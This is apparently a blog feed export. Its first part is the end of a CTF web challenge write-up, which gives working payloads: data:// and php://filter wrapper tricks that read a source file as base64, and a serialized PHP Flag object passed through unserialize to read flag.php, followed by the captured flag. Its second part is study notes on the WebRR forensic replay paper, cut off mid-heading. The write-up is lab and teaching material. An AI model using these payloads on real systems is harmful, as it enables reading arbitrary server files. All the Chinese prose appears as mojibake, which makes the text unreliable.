å…¥ï¼Œtext,file,password</p><p>issetçš„ä½œç”¨æ˜¯æ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”énull</p><p>file_get_contentsçš„ä½œç”¨æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>å°†textæ–‡ä»¶ä¸­è¯»å–å­—ç¬¦ä¸²ï¼Œè¿˜è¦å’Œwelcome to the zjctfç›¸ç­‰</p><p>ä½¿ç”¨çš„æ˜¯data:&#x2F;&#x2F;å†™å…¥åè®®</p><p>æ‰€ä»¥æ„é€ ç¬¬ä¸€ä¸ªpayloadï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">text</span>=data://<span class="hljs-keyword">text</span>/plain,welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br></code></pre></td></tr></table></figure><p><img src="/2024/02/04/WebWriteUp4/image-20240209184828696.png" alt="image-20240209184828696"></p><p>æˆåŠŸå›æ˜¾</p><p>è§‚å¯Ÿåˆ°æºç ä¸­åŒ…å«äº†ä¸€ä¸ªuseless.phpæ–‡ä»¶ï¼Œå°è¯•ä½¿ç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œæ„é€ payloadï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>: ä½¿ç”¨ <code>data://</code> åè®®ï¼Œè¡¨ç¤ºæ¥ä¸‹æ¥çš„å†…å®¹æ˜¯æ•°æ®è€Œä¸æ˜¯æ–‡ä»¶è·¯å¾„ï¼Œ<code>text/plain;base64,</code> è¡¨ç¤ºæ•°æ®æ˜¯ä»¥ Base64 ç¼–ç çš„çº¯æ–‡æœ¬ã€‚è§£ç åçš„æ–‡æœ¬æ˜¯ â€œwelcome to the zjctfâ€ã€‚</p><p><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>: ä½¿ç”¨ <code>php://filter</code> åè®®ï¼Œå®ƒå…è®¸å¯¹èµ„æºåº”ç”¨è¿‡æ»¤å™¨ã€‚<code>read=convert.base64-encode/resource=</code> è¡¨ç¤ºè¯»å– <code>useless.php</code> æ–‡ä»¶å¹¶å°†å…¶å†…å®¹é€šè¿‡ Base64 ç¼–ç è¿›è¡Œè¾“å‡ºã€‚</p><p><img src="/2024/02/04/WebWriteUp4/image-20240209185545155.png" alt="image-20240209185545155"></p><p>å°†å¾—åˆ°çš„å†…å®¹è¿›è¡Œè§£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼š</p><p>å¦‚æœ <code>$file</code> å±æ€§è¢«è®¾ç½®ï¼Œ<code>__toString</code> æ–¹æ³•å°†è¯»å–æ–‡ä»¶å†…å®¹å¹¶è¾“å‡ºã€‚</p><p>å†çœ‹è¿™ä¸€æ®µï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <span class="hljs-comment">//useless.php     </span><br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);     <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;  <br></code></pre></td></tr></table></figure><p>æ¶‰åŠåˆ°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œæ‰€ä»¥æ ¹æ®ä¹‹å‰åšçš„ååºåˆ—åŒ–çš„é¢˜ï¼ˆå‚è€ƒWebWriteUp3ï¼‰</p><p>æ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ï¼Œè®©å…¶èƒ½é€šè¿‡ååºåˆ—åŒ–çš„æ–¹æ³•è¯»å–flag.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="/2024/02/04/WebWriteUp4/image-20240209190057457.png" alt="image-20240209190057457"></p><p>æ„é€ æ–°çš„payloadï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125; <br></code></pre></td></tr></table></figure><p><img src="/2024/02/04/WebWriteUp4/image-20240209190541123.png" alt="image-20240209190541123"></p><p>åœ¨æºç ä¸­æ‰¾åˆ°flag</p><!--?phpif(2===3){      return ("flag{2b87fa4f-65d8-41ab-b0c0-f22dab6eca91}");}?-->]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebRR</title>
    <link href="/2024/02/02/WebRR/"/>
    <url>/2024/02/02/WebRR/</url>
    
    <content type="html"><![CDATA[<h2 id="WEBRR-A-Forensic-System-for-Replaying-and-Investigating-Web-Based-Attacks-in-The-Modern-Web"><a href="#WEBRR-A-Forensic-System-for-Replaying-and-Investigating-Web-Based-Attacks-in-The-Modern-Web" class="headerlink" title="WEBRR: A Forensic System for Replaying and Investigating Web-Based Attacks in The Modern Web"></a>WEBRR: A Forensic System for Replaying and Investigating Web-Based Attacks in The Modern Web</h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p>åŸºäºChromiumçš„æµè§ˆå™¨ä½¿ç”¨å¤šè¿›ç¨‹æ¶æ„ã€‚ä¸»è¿›ç¨‹æ˜¯æµè§ˆå™¨è¿›ç¨‹ï¼Œç±»ä¼¼äºæ“ä½œç³»ç»Ÿçº§åˆ«çš„å†…æ ¸ã€‚ç„¶åï¼Œåœ¨æ²™ç®±åŒ–çš„æ¸²æŸ“è¿›ç¨‹ä¸­å‘ˆç°Webå†…å®¹ï¼Œè¿™äº›è¿›ç¨‹æ— æ³•ç›´æ¥è®¿é—®ç½‘ç»œæˆ–åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚æœ¬æ–‡æå‡ºçš„WebRRæ˜¯åŸºäºChromiumæµè§ˆå™¨æ„å»ºçš„ï¼Œå¹¶ä¸”ä¸»è¦åœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­å®ç°</p><blockquote><p>æ²™ç®±ï¼š</p><p>æ²™ç®±æ˜¯ä¸€ä¸ª C++ libraryï¼Œæ²™ç®±è¿›ç¨‹ä¾¿æ˜¯é€šè¿‡è¯¥<code>C++ library</code>æ‰€åˆ›å»ºï¼Œä¸ºäº†ç¡®ä¿å®‰å…¨æ€§ï¼Œæ²™ç®±è¿›ç¨‹æ‰€å¤„çš„æ‰§è¡Œç¯å¢ƒæ˜¯éå¸¸å—é™çš„ã€‚æ²™ç›’è¿›ç¨‹å¯ä»¥è‡ªç”±ä½¿ç”¨çš„å”¯ä¸€èµ„æºæ˜¯ CPU å‘¨æœŸå’Œå†…å­˜ã€‚ä¾‹å¦‚ï¼Œæ²™ç®±è¿›ç¨‹ä¸èƒ½å‘ç£ç›˜å†™æ•°æ®æˆ–æ˜¾ç¤ºå®ƒä»¬è‡ªå·±çš„çª—å£ã€‚æ²™ç®±é™åˆ¶äº†åœ¨æ²™ç®±å†…è¿è¡Œä»£ç çš„ bug çš„å½±å“æ€§ï¼Œä¾‹å¦‚ï¼šè¿™ç§bugä¸èƒ½åœ¨ç”¨æˆ·å¸æˆ·ä¸­å®‰è£…æŒä¹…æ€§æ¶æ„è½¯ä»¶ï¼ˆå› ä¸ºæ²™ç®±ç¦æ­¢å†™å…¥æ–‡ä»¶ç³»ç»Ÿï¼‰ä¹Ÿä¸èƒ½ä»è®¡ç®—æœºæœ¬åœ°å½“ä¸­è¯»å–ä»»ä½•æ–‡ä»¶ã€‚æ²™ç®±ä¸èƒ½å¤Ÿå¯¹ç³»ç»Ÿç»„ä»¶æä¾›ä¿æŠ¤ï¼ˆå¦‚è¿è¡Œå®ƒçš„å†…æ ¸ï¼‰</p></blockquote><h4 id="æ¸²æŸ“è¿›ç¨‹"><a href="#æ¸²æŸ“è¿›ç¨‹" class="headerlink" title="æ¸²æŸ“è¿›ç¨‹"></a>æ¸²æŸ“è¿›ç¨‹</h4><p>åŒ…å«å››ä¸ªä¸»è¦ç»„ä»¶</p><ul><li><p><strong>æ¸²æŸ“å¼•æ“ï¼ˆBlinkï¼‰</strong>ï¼š</p><p><strong>åŠŸèƒ½ï¼š</strong> è´Ÿè´£å‘ˆç°ç½‘ç«™ï¼Œå¤„ç†HTMLè§£æã€ç»´æŠ¤DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰å¹¶å®ç°æš´éœ²äºV8çš„ç½‘ç»œAPIã€‚</p><p><strong>å¤šçº¿ç¨‹æ€§è´¨ï¼š</strong> æ˜¯ä¸€ä¸ªé«˜åº¦å¤šçº¿ç¨‹çš„ç»„ä»¶ï¼Œå¯ä»¥å¹¶è¡Œå¤„ç†å¤šä¸ªä»»åŠ¡ã€‚</p></li><li><p><strong>JSå¼•æ“ï¼ˆV8ï¼‰</strong>ï¼š</p><p><strong>åŠŸèƒ½ï¼š</strong> æ‰§è¡ŒWebåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰JavaScriptç»„ä»¶ï¼ŒåŒ…æ‹¬è„šæœ¬ã€å›è°ƒå’Œäº‹ä»¶å¤„ç†ç¨‹åºã€‚</p><blockquote><p>åœ¨ JavaScript ä¸­ï¼Œå‡½æ•°æ˜¯å¯¹è±¡ã€‚å› æ­¤ï¼Œå‡½æ•°å¯ä»¥å°†å‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶ä¸”å¯ä»¥ç”±å…¶ä»–å‡½æ•°è¿”å›ã€‚æ‰§è¡Œæ­¤æ“ä½œçš„å‡½æ•°ç§°ä¸ºé«˜é˜¶å‡½æ•°ã€‚ä»»ä½•ä½œä¸ºå‚æ•°ä¼ é€’çš„å‡½æ•°éƒ½ç§°ä¸ºå›è°ƒå‡½æ•°ã€‚</p><p>é€šå¸¸ç”¨æ¥å¤„ç†å¼‚æ­¥</p></blockquote><p><strong>å¤šçº¿ç¨‹æ€§è´¨ï¼š</strong> æ¯ä¸ªæ¸²æŸ“è¿‡ç¨‹éƒ½åŒ…æ‹¬V8å¼•æ“çš„ä¸€ä¸ªå®ä¾‹ï¼Œç”¨äºæ‰§è¡ŒJavaScriptä»£ç ã€‚</p></li><li><p><strong>ç»‘å®šå±‚</strong>ï¼š</p><p><strong>ä½œç”¨ï¼š</strong> å°†Blinkå’ŒV8è¿æ¥åœ¨ä¸€èµ·ï¼Œé€šè¿‡æš´éœ²åŠŸèƒ½å®ç°å®ƒä»¬ä¹‹é—´çš„äº¤äº’ã€‚</p><p><strong>ç”Ÿæˆæ–¹å¼ï¼š</strong> è¿™äº›APIæ˜¯åœ¨ç¼–è¯‘Chromiumæ—¶é€šè¿‡ç»‘å®šç”Ÿæˆå™¨ç”Ÿæˆçš„ï¼Œå°†WebIDLæ–‡ä»¶ç¼–è¯‘æˆC++ä»£ç  </p><blockquote><p>WebIDLï¼Œå…¨ç§°ä¸ºWeb Interface Definition Languageï¼ˆWebæ¥å£å®šä¹‰è¯­è¨€ï¼‰ï¼Œæ˜¯ä¸€ç§ç”¨äºæè¿°Webå¹³å°ä¸Šçš„APIæ¥å£çš„è§„èŒƒè¯­è¨€ã€‚å®ƒæä¾›äº†ä¸€ç§å½¢å¼åŒ–çš„æ–¹å¼ï¼Œç”¨äºå®šä¹‰æ¥å£ã€æ–¹æ³•ã€å±æ€§ç­‰åœ¨Webæµè§ˆå™¨å’Œå…¶ä»–ç¯å¢ƒä¸­å®ç°çš„APIçš„ç»“æ„å’Œè¡Œä¸ºã€‚</p></blockquote></li><li><p><strong>å¹³å°å±‚</strong>ï¼š</p><p><strong>ä½œç”¨ï¼š</strong> æ˜¯ä¸æµè§ˆå™¨è¿‡ç¨‹é€šä¿¡çš„é™„åŠ ä¸­é—´å±‚ï¼Œå…è®¸Blinkå’ŒV8é€šè¿‡è¿™ä¸€å±‚ä¸æµè§ˆå™¨è¿‡ç¨‹è¿›è¡Œé€šä¿¡ã€‚</p></li></ul><h4 id="æ¸²æŸ“çº¿ç¨‹"><a href="#æ¸²æŸ“çº¿ç¨‹" class="headerlink" title="æ¸²æŸ“çº¿ç¨‹"></a>æ¸²æŸ“çº¿ç¨‹</h4><ul><li><strong>æ¸²æŸ“çº¿ç¨‹ï¼ˆRender Threadï¼‰ï¼š</strong><ul><li><strong>èŒè´£ï¼š</strong> æ¸²æŸ“çº¿ç¨‹æ˜¯æ¸²æŸ“è¿›ç¨‹ä¸­çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œä¸»è¦è´Ÿè´£å¤„ç†ä¸é¡µé¢æ¸²æŸ“ç›¸å…³çš„ä»»åŠ¡ã€‚</li><li>åŠŸèƒ½ï¼š<ul><li>è´Ÿè´£å°†é¡µé¢çš„HTMLå’ŒCSSæ¸²æŸ“æˆå¯è§†åŒ–çš„é¡µé¢ï¼ŒåŒ…æ‹¬å¸ƒå±€ã€æ ·å¼å’Œç»˜åˆ¶ç­‰æ“ä½œã€‚</li><li>æ‰§è¡Œä¸é¡µé¢å…³è”çš„JavaScriptä»£ç ï¼ŒåŒ…æ‹¬é€šè¿‡è„šæœ¬æ ‡ç­¾å¼•å…¥çš„è„šæœ¬å’ŒåµŒå…¥åœ¨HTMLæ–‡æ¡£ä¸­çš„è„šæœ¬ã€‚</li><li>å¤„ç†DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰çš„æ“ä½œï¼ŒåŒ…æ‹¬å¯¹æ–‡æ¡£å…ƒç´ çš„å¢åˆ æ”¹æŸ¥ã€‚</li><li>å¤„ç†ä¸é¡µé¢ç›¸å…³çš„äº‹ä»¶ï¼Œä¾‹å¦‚ç”¨æˆ·äº¤äº’å’Œé¼ æ ‡ç‚¹å‡»ç­‰ã€‚</li></ul></li></ul></li><li><strong>WebWorkerçº¿ç¨‹ï¼š</strong><ul><li><strong>èŒè´£ï¼š</strong> WebWorkerçº¿ç¨‹æ˜¯åœ¨åå°ç‹¬ç«‹è¿è¡Œçš„JavaScriptçº¿ç¨‹ï¼Œä¸ä¸»çº¿ç¨‹ï¼ˆæ¸²æŸ“çº¿ç¨‹ï¼‰ç›¸äº’ç‹¬ç«‹ï¼Œç”¨äºæ‰§è¡Œä¸€äº›è€—æ—¶çš„æˆ–éœ€è¦åœ¨åå°è¿è¡Œçš„ä»»åŠ¡ã€‚</li><li>ç‰¹ç‚¹ï¼š<ul><li>ç‹¬ç«‹äºä¸»çº¿ç¨‹ï¼Œä¸é˜»å¡ä¸»çº¿ç¨‹çš„æ‰§è¡Œï¼Œå› æ­¤å¯ä»¥æé«˜é¡µé¢çš„å“åº”æ€§ã€‚</li><li>é€šè¿‡æ¶ˆæ¯ä¼ é€’æœºåˆ¶ä¸ä¸»çº¿ç¨‹é€šä¿¡ï¼Œä½†æ— æ³•ç›´æ¥è®¿é—®DOMã€‚</li><li>å¯ä»¥ç”¨äºæ‰§è¡Œå¤æ‚çš„è®¡ç®—ã€å¤§è§„æ¨¡æ•°æ®å¤„ç†ç­‰ä»»åŠ¡ï¼Œè€Œä¸å½±å“ç”¨æˆ·ç•Œé¢çš„äº¤äº’æ€§ã€‚</li></ul></li></ul></li><li><strong>ServiceWorkerçº¿ç¨‹ï¼š</strong><ul><li><strong>èŒè´£ï¼š</strong> ServiceWorkerçº¿ç¨‹ä¹Ÿæ˜¯åœ¨åå°ç‹¬ç«‹è¿è¡Œçš„JavaScriptçº¿ç¨‹ï¼Œä½†å…¶è®¾è®¡ç›®çš„æ˜¯æ”¹å–„ç¦»çº¿Webåº”ç”¨çš„ä½“éªŒï¼Œå¹¶æä¾›æ¨é€é€šçŸ¥ç­‰åŠŸèƒ½ã€‚</li><li>ç‰¹ç‚¹ï¼š<ul><li>ç‹¬ç«‹äºæµè§ˆå™¨çª—å£å’Œé¡µé¢ï¼Œæ³¨å†Œåä¸€ç›´åœ¨åå°è¿è¡Œã€‚</li><li>å¯ä»¥æ‹¦æˆªå’Œå¤„ç†ç½‘ç»œè¯·æ±‚ï¼ŒåŒ…æ‹¬åœ¨ç¦»çº¿çŠ¶æ€ä¸‹ç¼“å­˜å†…å®¹ä»¥æä¾›ç¦»çº¿è®¿é—®ã€‚</li><li>å…·æœ‰ä¸€äº›ç‰¹æ®Šçš„äº‹ä»¶ï¼Œå¦‚fetchäº‹ä»¶ï¼Œå…è®¸ServiceWorkeræ‹¦æˆªå’Œä¿®æ”¹ç½‘ç»œè¯·æ±‚ã€‚</li><li>å¯ä»¥æ¥æ”¶æ¥è‡ªåç«¯æœåŠ¡å™¨çš„æ¨é€æ¶ˆæ¯ï¼Œå¹¶è§¦å‘æµè§ˆå™¨é€šçŸ¥</li></ul></li></ul></li></ul><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><h4 id="é’ˆå¯¹çš„é—®é¢˜"><a href="#é’ˆå¯¹çš„é—®é¢˜" class="headerlink" title="é’ˆå¯¹çš„é—®é¢˜"></a><strong>é’ˆå¯¹çš„é—®é¢˜</strong></h4><p>åœ¨ä¼ä¸šé­å—å¤æ‚æ”»å‡»æˆ–å‘ç”Ÿæ•°æ®æ³„æ¼åï¼Œéœ€è¦è¿›è¡Œå–è¯åˆ†æï¼Œé‡å»ºå’Œäº†è§£æ”»å‡»çš„æ ¹æœ¬åŸå› </p><h4 id="ç°çŠ¶"><a href="#ç°çŠ¶" class="headerlink" title="ç°çŠ¶"></a>ç°çŠ¶</h4><p>ä¸ºè§£å†³ä¸Šè¿°é—®é¢˜ï¼Œç°åœ¨å·²ç»å¼€å‘å‡ºäº†ç³»ç»Ÿçº§çš„å®¡è®¡ç³»ç»Ÿï¼ŒåŒ…æ‹¬æ•´ä¸ªç³»ç»Ÿçš„è®°å½•å’Œé‡æ’­æ–¹æ³•ã€‚ä½†æ­¤ç±»æ–¹æ³•çš„ä¸»è¦å±€é™æ€§å°±æ˜¯å…¶å¯¹Webæ”»å‡»çš„åˆ†ææ˜¯æœ‰é™çš„ï¼Œå› ä¸ºç³»ç»Ÿçº§æŠ½è±¡ï¼ˆä¾‹å¦‚è¿›ç¨‹ï¼Œå¥—æ¥å­—ï¼Œæ–‡ä»¶ï¼‰ï¼Œä¸å¤„ç†Webæ”»å‡»ç›¸å…³çš„å¿…è¦è¯­ä¹‰ä¹‹é—´å­˜åœ¨å¾ˆå¤§çš„å·®è·ï¼ˆä¾‹å¦‚HTML&#x2F;CSSå’ŒJavascriptï¼‰</p><p>æ‰€ä»¥ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p><p>åˆæ­¥å°è¯•å°±æ˜¯æå‡ºäº†å…·æœ‰å®¡è®¡åŠŸèƒ½çš„å®‰å…¨çº§æµè§ˆå™¨ï¼Œèƒ½æä¾›ç‰¹å®šäºWebçš„å®¡è®¡ç³»ç»Ÿã€‚ä½†å½“å‰ç³»ç»Ÿæ˜¯ä»…è®°å½•çš„ç³»ç»Ÿï¼Œä¸æä¾›é‡æ”¾åŠŸèƒ½ã€‚</p><p>æ¥ç€å°±æ˜¯æå‡ºäº†ä¸€äº›é¢å‘Webçš„è®°å½•å’Œå›æ”¾ç³»ç»Ÿï¼Œè¿™äº›å¤šæ•°å…³æ³¨äºæ”¯æŒè°ƒè¯•å’Œæµ‹è¯•ï¼Œå¹¶æ²¡æœ‰è€ƒè™‘åˆ°å®‰å…¨å®¡è®¡ã€‚è¿›è¡Œå®‰å…¨çº§å®¡è®¡ï¼Œéœ€è¦åœ¨å–è¯ç¯å¢ƒä¸­ä¿æŒè®°å½•çŠ¶æ€ï¼Œä½†æµè¡Œçš„æµ‹è¯•å·¥å…·Mozillaçš„rrï¼ˆrecord and replayï¼‰ä¼šå¯¼è‡´è¶…è¿‡4å€çš„å¼€é”€ã€‚</p><h4 id="éœ€è¦æ»¡è¶³çš„æ¡ä»¶"><a href="#éœ€è¦æ»¡è¶³çš„æ¡ä»¶" class="headerlink" title="éœ€è¦æ»¡è¶³çš„æ¡ä»¶"></a>éœ€è¦æ»¡è¶³çš„æ¡ä»¶</h4><p>å®ç°å–è¯çº§çš„è®°å½•å’Œé‡æ”¾ï¼š</p><ul><li>ç¡®å®šæ€§é‡æ”¾ï¼šå³ç¡®ä¿é‡æ”¾çš„è·¯å¾„ä¸è®°å½•çš„è·¯å¾„è¦ä¸€æ ·ã€‚å¦‚æœä¸åŒï¼Œå¯èƒ½ä¼šé˜»æ­¢æ”»å‡»æ­£ç¡®æˆ–å…¨éƒ¨é‡æ”¾ï¼Œè¿›è€Œå¯¼è‡´æ— æ³•åˆ†ææ”»å‡»çš„æ ¹æœ¬åŸå› </li><li>å§‹ç»ˆåœ¨çº¿è®°å½•ï¼šå› ä¸ºæ”»å‡»å› ä¸ºæ”»å‡»æ˜¯ä¸å¯é¢„æµ‹çš„å’ŒçŸ­æš‚çš„ï¼Œæ‰€ä»¥å®¡è®¡æ—¥å¿—è®°å½•å¿…é¡»å§‹ç»ˆæ‰“å¼€</li><li>é˜²ç¯¡æ”¹ï¼šå®¡è®¡ç³»ç»Ÿä¸å®¹æ˜“è¢«æ”»å‡»è€…ç¯¡æ”¹æˆ–ç¦ç”¨</li><li>å¯ç§»æ¤ï¼šåŸºäºWebçš„å–è¯è®°å½•å’Œå®¡è®¡ç³»ç»Ÿè¦ç‹¬ç«‹äºOSå’Œè®¾å¤‡</li></ul><h4 id="æå‡ºçš„æ¨¡å‹"><a href="#æå‡ºçš„æ¨¡å‹" class="headerlink" title="æå‡ºçš„æ¨¡å‹"></a>æå‡ºçš„æ¨¡å‹</h4><p><img src="/2024/02/02/WebRR/image-20240202202110475.png" alt="image-20240202202110475"></p><p>WEBRRé€šè¿‡åˆ©ç”¨JavaScriptæ‰§è¡Œå•å…ƒåˆ†åŒºçš„æ¦‚å¿µæ¥é‡æ–°æ„æƒ³å¦‚ä½•é‡æ”¾ç½‘ç«™ï¼Œå°†Webåº”ç”¨çš„JSåˆ†åŒºä¸ºä¸€ç³»åˆ—JavaScriptæ‰§è¡Œå•å…ƒï¼ˆJEUsï¼‰ï¼Œå…¶ä¸­JEUè¡¨ç¤ºè„šæœ¬ã€å›è°ƒæˆ–äº‹ä»¶å¤„ç†ç¨‹åºã€‚æ¥ä¸‹æ¥ï¼Œåœ¨é‡æ”¾æœŸé—´ï¼ŒWEBRRé€šè¿‡é‡æ”¾æ¯ä¸ªå•ç‹¬çš„JEUåŒæ—¶ä¿ç•™è®°å½•çš„æ‰§è¡Œé¡ºåºæ¥é‡æ”¾åº”ç”¨ç¨‹åºã€‚</p><h4 id="å¨èƒæ¨¡å‹"><a href="#å¨èƒæ¨¡å‹" class="headerlink" title="å¨èƒæ¨¡å‹"></a>å¨èƒæ¨¡å‹</h4><p>æœ¬å®éªŒå‡è®¾WebRRéƒ¨ç½²åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œå…¶å¨èƒæ¨¡å‹å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ol><li><strong>æ—¥å¿—å®‰å…¨æ€§ï¼š</strong> WEBRRå‡è®¾ç”Ÿæˆçš„æ—¥å¿—æ˜¯é˜²ç¯¡æ”¹çš„ï¼Œé€šè¿‡åŠ å¯†å¹¶å­˜å‚¨åœ¨å®‰å…¨æ–‡ä»¶æœåŠ¡å™¨ä¸Šæ¥ç¡®ä¿æ—¥å¿—çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ã€‚</li><li><strong>ä¸ªäººéšç§ï¼š</strong> ä¸ºäº†ä¿æŠ¤ç”¨æˆ·çš„ä¸ªäººéšç§ï¼Œä¸åŒç½‘ç«™å’Œæ—¶é—´æ®µçš„æ—¥å¿—å¯ä»¥ä½¿ç”¨ä¸åŒçš„å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œä»¥å‡å°‘åœ¨è°ƒæŸ¥è¿‡ç¨‹ä¸­æ³„éœ²çš„ä¸ªäººä¿¡æ¯ã€‚</li><li><strong>å¯†é’¥ç®¡ç†ï¼š</strong> åŠ å¯†å¯†é’¥å¯ä»¥å®‰å…¨åœ°å­˜å‚¨åœ¨å¯†é’¥æ‰˜ç®¡ä¸­ï¼Œä»¥ç¡®ä¿å¯†é’¥çš„å®‰å…¨æ€§ï¼Œåªæœ‰åœ¨è°ƒæŸ¥éœ€è¦æ—¶æ‰èƒ½è§£å¯†å¹¶ä¸åˆ†æå¸ˆå…±äº«ã€‚</li><li><strong>æµè§ˆå™¨å®‰å…¨æ€§ï¼š</strong> WEBRRåœ¨å¨èƒæ¨¡å‹ä¸­å‡è®¾æµè§ˆå™¨åº”ç”¨ç¨‹åºåœ¨æ”»å‡»å‘ç”Ÿæ—¶ä¸è¢«ç ´åï¼Œä»è€Œå¯ä¿¡ä»»è®°å½•çš„æ—¥å¿—ã€‚å³ä½¿æµè§ˆå™¨è¢«ç ´åï¼ŒWEBRRä»ç„¶èƒ½å¤Ÿè®°å½•æ”»å‡»çš„æ‰€æœ‰æ­¥éª¤ï¼Œç›´åˆ°å®é™…ç ´åå‘ç”Ÿã€‚</li></ol><h3 id="WebRR"><a href="#WebRR" class="headerlink" title="WebRR"></a>WebRR</h3><h4 id="è®°å½•ï¼ˆrecordï¼‰"><a href="#è®°å½•ï¼ˆrecordï¼‰" class="headerlink" 